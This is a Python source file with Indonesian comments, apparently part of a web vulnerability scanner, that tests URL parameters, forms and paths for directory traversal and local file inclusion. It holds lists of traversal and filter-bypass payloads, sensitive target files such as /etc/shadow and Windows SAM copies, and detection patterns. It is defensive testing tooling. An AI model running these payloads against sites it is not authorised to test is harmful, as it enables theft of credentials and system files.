import asyncio
import re
from typing import Dict, List, Any, Set, Optional
import urllib.parse
import os.path

from core.base_scanner import BaseScanner
from core.models import (
    HttpRequest, 
    HttpResponse, 
    VulnerabilityType, 
    VulnerabilitySeverity,
    Vulnerability
)


class DirectoryTraversalScanner(BaseScanner):
    """
    Scanner kerentanan Directory Traversal (Path Traversal) dan Local File Inclusion (LFI).
    
    Scanner ini mendeteksi kerentanan yang memungkinkan akses ke file sistem dengan cara:
    1. Menguji parameter dengan payload traversal direktori
    2. Mendeteksi konten file yang terekspos dalam respons
    3. Menggunakan berbagai teknik encoding untuk melewati filter
    """
    
    def __init__(self):
        super().__init__()
        self.name = "DirectoryTraversalScanner"
        self.description = "Mendeteksi kerentanan Directory Traversal dan Local File Inclusion"
        
        # Payload dasar untuk directory traversal
        self.basic_traversal_payloads = [
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "../../../../../../",
            "../../../../../../../",
            "../../../../../../../../",
            "../../../../../../../../../",
            "../../../../../../../../../../",
            "../../../../../../../../../../../",
            "../../../../../../../../../../../../",
            "..//",
            "./../",
            ".././",
            "..\\",
            "..\\..\\",
            "..\\..\\..\\",
            "..\\..\\..\\..\\",
        ]
        
        # Payload traversal dengan encoding
        self.encoded_traversal_payloads = [
            # URL encoded
            "%2e%2e%2f",
            "%2e%2e/",
            "..%2f",
            "%2e%2e%5c",
            # Double URL encoded
            "%252e%252e%252f",
            "%252e%252e/",
            # Unicode/UTF-8 representation
            "..%c0%af",  # Overlong UTF-8 encoding
            "%c0%ae%c0%ae/",  # Overlong UTF-8 encoding
            "..%ef%bc%8f",  # Unicode full-width slash
            # Null byte bypass
            "../%00",
            "../%00/",
            "../file.txt%00.jpg",
            # URL parameter pollution
            "....//",
            "....\\\\",
            # Path normalization
            ".//..//",
            "//..//..//",
            "..///",
            "...//../",
            # Unicode normalization
            "..%u2215",  # Unicode division slash
            "..%u2216",  # Unicode set minus
        ]
        
        # Target file untuk berbagai sistem operasi
        self.unix_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/motd",
            "/etc/issue",
            "/etc/group",
            "/etc/mysql/my.cnf",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/httpd/access.log",
            "/var/log/httpd/error.log",
            "/var/www/html/index.php",
            "/usr/local/apache2/conf/httpd.conf",
            "/home/user/.bash_history",
            "/root/.bash_history",
        ]
        
        self.windows_files = [
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\debug\\NetSetup.log",
            "C:\\Windows\\repair\\sam",
            "C:\\Windows\\repair\\system",
            "C:\\Windows\\repair\\software",
            "C:\\Windows\\repair\\security",
            "C:\\Windows\\system.ini",
            "C:\\Windows\\Panther\\Unattend.xml",
            "C:\\Windows\\Panther\\Unattended.xml",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log",
            "C:\\boot.ini",
        ]
        
        # Pattern untuk mendeteksi konten file yang terekspos
        self.unix_pattern = [
            # /etc/passwd
            r"root:.*?:0:0:",
            r"bin:.*?:1:1:",
            r"nobody:.*?:99:",
            r"www-data:.*?:\d+:\d+:",
            # /etc/shadow
            r"root:\$[1-6]\$",
            # /etc/hosts
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
            # proc
            r"DOCUMENT_ROOT=",
            r"HTTP_USER_AGENT=",
            r"SERVER_SOFTWARE=",
            # Log files
            r"\d+\.\d+\.\d+\.\d+ - .* \[\d+/\w+/\d+:\d+:\d+:\d+ [\+\-]\d+\] \"[A-Z]+ .* HTTP/\d\.\d\" \d+ \d+",
            r"\[.+\] \[.+\] \[.+\] .+",
        ]
        
        self.windows_pattern = [
            # win.ini
            r"\[fonts\]",
            r"\[extensions\]",
            r"for 16-bit app support",
            # hosts
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
            # boot.ini
            r"\[boot loader\]",
            r"\[operating systems\]",
            r"multi\(0\)disk\(0\)rdisk\(0\)",
            # Unattend.xml
            r"<unattend ",
            r"<\?xml version=\"1.0\" encoding",
            r"<password>",
            # web.config
            r"<configuration>",
            r"<system.webServer>",
            r"<connectionStrings>",
        ]
        
        # Compile regex patterns
        self.unix_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.unix_pattern]
        self.windows_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.windows_pattern]
    
    async def scan(self, target_url: str) -> List[Vulnerability]:
        """
        Scan URL target untuk kerentanan directory traversal.
        
        Args:
            target_url: URL yang akan dipindai
            
        Returns:
            Daftar kerentanan yang terdeteksi
        """
        self.logger.info(f"Memindai {target_url} untuk kerentanan directory traversal")
        
        # Hapus kerentanan sebelumnya
        self.clear_vulnerabilities()
        
        try:
            # Dapatkan respons awal
            request, response = await self.send_request(target_url)
            
            # Ekstrak parameter dari URL
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # Uji parameter URL
            if query_params:
                await self._test_parameters(target_url, query_params)
            
            # Ekstrak dan uji form
            if response.body:
                forms = self.extract_forms(response.body, target_url)
                for form in forms:
                    await self._test_form(form, target_url)
            
            # Uji path URL (untuk traversal di jalur)
            if "/" in parsed_url.path:
                await self._test_path(target_url)
            
        except Exception as e:
            self.logger.error(f"Error memindai {target_url}: {str(e)}")
        
        return self.vulnerabilities
    
    async def _test_parameters(self, url: str, params: Dict[str, List[str]]) -> None:
        """
        Uji parameter URL untuk kerentanan directory traversal.
        
        Args:
            url: URL dasar
            params: Dictionary parameter URL
        """
        self.logger.debug(f"Menguji {len(params)} parameter dalam URL {url}")
        
        # Buat tugas untuk pengujian paralel
        tasks = []
        for param_name, param_values in params.items():
            param_value = param_values[0] if param_values else ''
            
            # Jika parameter terlihat seperti nama file atau path, prioritaskan pengujian
            is_file_param = any(x in param_name.lower() for x in ['file', 'path', 'dir', 'include', 'require', 'read', 'load', 'upload', 'doc'])
            
            # Uji parameter
            tasks.append(self._test_traversal(url, param_name, param_value, is_file_param))
        
        # Jalankan semua tes secara paralel
        await asyncio.gather(*tasks)
    
    async def _test_form(self, form: Dict[str, Any], base_url: str) -> None:
        """
        Uji input form untuk kerentanan directory traversal.
        
        Args:
            form: Data form
            base_url: URL dasar dari halaman yang berisi form
        """
        form_action = form.get('action', '')
        form_method = form.get('method', 'GET')
        inputs = form.get('inputs', [])
        
        self.logger.debug(f"Menguji form dengan action {form_action} dan method {form_method}")
        
        if not inputs:
            return
        
        # Buat pengajuan form dasar dengan nilai asli
        form_data = {}
        for input_field in inputs:
            field_name = input_field.get('name', '')
            field_value = input_field.get('value', '')
            if field_name:
                form_data[field_name] = field_value
        
        # Uji setiap bidang input
        tasks = []
        for input_field in inputs:
            field_name = input_field.get('name', '')
            field_value = input_field.get('value', '')
            field_type = input_field.get('type', 'text')
            
            # Lewati hidden, checkbox, radio, dll.
            if field_type not in ['text', 'search', 'url', 'tel', 'email', 'password', 'file', 'textarea']:
                continue
            
            # Periksa jika bidang input terlihat seperti file/path
            is_file_param = any(x in field_name.lower() for x in ['file', 'path', 'dir', 'include', 'require', 'read', 'load', 'upload', 'doc'])
            
            # Buat tugas untuk pengujian paralel
            target_url = form_action or base_url
            if form_method.upper() == 'GET':
                tasks.append(self._test_traversal(target_url, field_name, field_value, is_file_param, method='GET', form_data=form_data.copy()))
            else:  # POST
                tasks.append(self._test_traversal(target_url, field_name, field_value, is_file_param, method='POST', form_data=form_data.copy()))
        
        # Jalankan semua tes secara paralel
        await asyncio.gather(*tasks)
    
    async def _test_path(self, url: str) -> None:
        """
        Uji path URL untuk kerentanan directory traversal.
        
        Args:
            url: URL target
        """
        parsed_url = urllib.parse.urlparse(url)
        path_parts = parsed_url.path.split('/')
        
        # Periksa jika path terlihat seperti mencakup file
        if len(path_parts) <= 1:
            return
        
        # Ekstrak ekstensi file jika ada
        file_ext = None
        if '.' in path_parts[-1]:
            file_ext = path_parts[-1].split('.')[-1]
        
        # Uji traversal pada bagian path terakhir
        for i in range(len(path_parts) - 1, 0, -1):
            for payload_base in self.basic_traversal_payloads[:5]:  # Gunakan subset payload untuk efisiensi
                for target_file in self._get_test_files(file_ext):
                    # Bangun payload dengan file target
                    payload = f"{payload_base}{target_file}"
                    
                    # Salin path parts dan ganti satu part dengan payload
                    new_path_parts = path_parts.copy()
                    new_path_parts[i] = payload
                    
                    # Buat URL baru dengan path yang dimodifikasi
                    new_path = '/'.join(filter(None, new_path_parts))
                    if not new_path.startswith('/'):
                        new_path = '/' + new_path
                        
                    new_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        new_path,
                        parsed_url.params,
                        parsed_url.query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        # Kirim permintaan
                        request, response = await self.send_request(new_url)
                        
                        # Periksa jika file berhasil diakses
                        if self._is_file_disclosure(response.body):
                            self.add_vulnerability(
                                name="Path-based Directory Traversal",
                                description=f"Kerentanan directory traversal terdeteksi di segmen path {i} dengan payload: {payload}",
                                vuln_type=VulnerabilityType.DIRECTORY_TRAVERSAL,
                                severity=VulnerabilitySeverity.HIGH,
                                request=request,
                                response=response,
                                evidence=self._extract_file_evidence(response.body),
                                payload=payload,
                                cwe_id=22,  # CWE-22: Improper Limitation of a Pathname to a Restricted Directory
                                remediation="Hindari penggunaan input pengguna langsung dalam operasi file. Gunakan whitelist ekstensi dan direktori yang diizinkan."
                            )
                            
                            self.logger.info(f"Directory traversal terdeteksi di segmen path {i} dengan payload {payload}")
                            return
                    except Exception as e:
                        self.logger.error(f"Error menguji path dengan payload {payload}: {str(e)}")
    
    async def _test_traversal(self, url: str, param_name: str, param_value: str, is_file_param: bool = False,
                            method: str = 'GET', form_data: Dict[str, str] = None) -> None:
        """
        Uji untuk kerentanan directory traversal.
        
        Args:
            url: URL target
            param_name: Nama parameter yang diuji
            param_value: Nilai parameter asli
            is_file_param: Apakah parameter terlihat seperti file/path
            method: Metode HTTP
            form_data: Data form untuk permintaan POST
        """
        # Tentukan payload mana yang akan diuji
        traversal_payloads = self.basic_traversal_payloads.copy()
        
        # Jika terlihat seperti parameter file, tambahkan payload encoding
        if is_file_param:
            traversal_payloads.extend(self.encoded_traversal_payloads)
            
        # Tentukan file yang akan dicoba diakses
        target_files = self._get_test_files(self._extract_extension(param_value))
        
        # Uji setiap kombinasi payload dan file target
        for base_payload in traversal_payloads:
            for target_file in target_files:
                # Bangun payload penuh
                payload = f"{base_payload}{target_file}"
                
                # Untuk parameter file, kita juga perlu menguji penggantian langsung
                if is_file_param:
                    # Tambahkan juga kasus di mana target_file digunakan langsung
                    direct_payloads = [payload, target_file]
                else:
                    direct_payloads = [payload]
                
                for test_payload in direct_payloads:
                    # Siapkan data permintaan
                    test_data = form_data.copy() if form_data else {}
                    test_data[param_name] = test_payload
                    
                    # Kirim permintaan
                    try:
                        if method == 'GET':
                            # Bangun URL dengan parameter
                            parsed_url = urllib.parse.urlparse(url)
                            query_dict = dict(urllib.parse.parse_qsl(parsed_url.query))
                            query_dict.update(test_data)
                            
                            # Rekonstruksi URL
                            new_query = urllib.parse.urlencode(query_dict)
                            new_url = urllib.parse.urlunparse((
                                parsed_url.scheme, 
                                parsed_url.netloc, 
                                parsed_url.path, 
                                parsed_url.params, 
                                new_query, 
                                parsed_url.fragment
                            ))
                            
                            request, response = await self.send_request(new_url, method='GET')
                        else:  # POST
                            request, response = await self.send_request(url, method='POST', data=test_data)
                        
                        # Periksa jika file berhasil diakses
                        if self._is_file_disclosure(response.body):
                            # Tentukan tipe kerentanan
                            if "include" in param_name.lower() or "require" in param_name.lower():
                                vuln_name = "Local File Inclusion (LFI)"
                                vuln_type = VulnerabilityType.FILE_INCLUSION
                            else:
                                vuln_name = "Directory Traversal"
                                vuln_type = VulnerabilityType.DIRECTORY_TRAVERSAL
                            
                            self.add_vulnerability(
                                name=vuln_name,
                                description=f"Kerentanan {vuln_name} terdeteksi dalam parameter {param_name} dengan payload: {test_payload}",
                                vuln_type=vuln_type,
                                severity=VulnerabilitySeverity.HIGH,
                                request=request,
                                response=response,
                                evidence=self._extract_file_evidence(response.body),
                                payload=test_payload,
                                cwe_id=22,  # CWE-22: Improper Limitation of a Pathname to a Restricted Directory
                                remediation="Hindari penggunaan input pengguna langsung dalam operasi file. Gunakan whitelist ekstensi dan direktori yang diizinkan. Jangan gunakan input pengguna dalam operasi file tanpa validasi yang kuat."
                            )
                            
                            # Catat temuan
                            self.logger.info(f"{vuln_name} terdeteksi dalam {param_name} di {url} dengan payload {test_payload}")
                            return
                            
                    except Exception as e:
                        self.logger.error(f"Error menguji {param_name} dengan payload {test_payload}: {str(e)}")
    
    def _get_test_files(self, extension: Optional[str] = None) -> List[str]:
        """
        Dapatkan daftar file yang akan diuji, berdasarkan ekstensi.
        
        Args:
            extension: Ekstensi file (opsional)
            
        Returns:
            Daftar file target untuk diuji
        """
        # Gabungkan file Unix dan Windows untuk pengujian
        all_files = self.unix_files + self.windows_files
        
        # Jika ekstensi diberikan, tambahkan beberapa file dengan ekstensi yang sama
        if extension:
            # File umum dengan ekstensi yang diberikan
            common_names = ["index", "admin", "config", "settings", "main", "default", "home", "user"]
            for name in common_names:
                all_files.append(f"{name}.{extension}")
        
        return all_files
    
    def _extract_extension(self, value: str) -> Optional[str]:
        """
        Ekstrak ekstensi file dari nilai parameter jika ada.
        
        Args:
            value: Nilai parameter
            
        Returns:
            Ekstensi file atau None
        """
        if not value or '.' not in value:
            return None
            
        # Tangani kasus di mana ada path, ambil hanya nama file
        filename = os.path.basename(value)
        parts = filename.split('.')
        
        # Jika ada setidaknya satu titik, ambil bagian terakhir sebagai ekstensi
        if len(parts) > 1:
            return parts[-1]
            
        return None
    
    def _is_file_disclosure(self, response_body: str) -> bool:
        """
        Periksa jika konten file sistem diungkapkan dalam respons.
        
        Args:
            response_body: Badan respons untuk diperiksa
            
        Returns:
            True jika konten file terungkap, False jika tidak
        """
        if not response_body:
            return False
        
        # Periksa pola Unix
        for pattern in self.unix_patterns:
            if pattern.search(response_body):
                return True
        
        # Periksa pola Windows
        for pattern in self.windows_patterns:
            if pattern.search(response_body):
                return True
        
        # Periksa indikator tambahan
        indicators = [
            # Indikator file passwd
            "root:x:0:0:",
            # Indikator win.ini
            "[fonts]",
            "[extensions]",
            # Indikator boot.ini
            "[boot loader]",
            "[operating systems]",
            # Indikator file log
            "HTTP_USER_AGENT=",
            "HTTP_HOST=",
            "HTTP_ACCEPT=",
            # Struktur XML
            "<?xml version=",
            "<config",
            "<configuration",
            # DB Connection strings
            "ConnectionString",
            "DATABASE_URL=",
            "mysql://",
            "postgresql://",
        ]
        
        for indicator in indicators:
            if indicator in response_body:
                return True
        
        return False
    
    def _extract_file_evidence(self, response_body: str) -> str:
        """
        Ekstrak bukti dari badan respons yang menunjukkan pengungkapan file.
        
        Args:
            response_body: Badan respons
            
        Returns:
            Bukti yang diekstrak atau string kosong
        """
        if not response_body:
            return ""
        
        # Cari semua pola dan ambil bukti terbaik
        evidence = ""
        
        # Cari menggunakan pola Unix
        for pattern in self.unix_patterns:
            match = pattern.search(response_body)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_body), match.end() + 50)
                evidence = f"...{response_body[start:end]}..."
                return evidence
        
        # Cari menggunakan pola Windows
        for pattern in self.windows_patterns:
            match = pattern.search(response_body)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_body), match.end() + 50)
                evidence = f"...{response_body[start:end]}..."
                return evidence
        
        # Cari indikator tambahan
        for indicator in [
            "root:x:0:0:", "[fonts]", "[extensions]", "[boot loader]",
            "[operating systems]", "HTTP_USER_AGENT=", "HTTP_HOST=",
            "<?xml version=", "<config", "<configuration"
        ]:
            if indicator in response_body:
                pos = response_body.find(indicator)
                start = max(0, pos - 50)
                end = min(len(response_body), pos + len(indicator) + 50)
                evidence = f"...{response_body[start:end]}..."
                return evidence
        
        # Jika tidak ada pola yang cocok, ambil sebagian respons
        if len(response_body) > 200:
            evidence = f"...{response_body[:200]}..."
        else:
            evidence = response_body
            
        return evidence
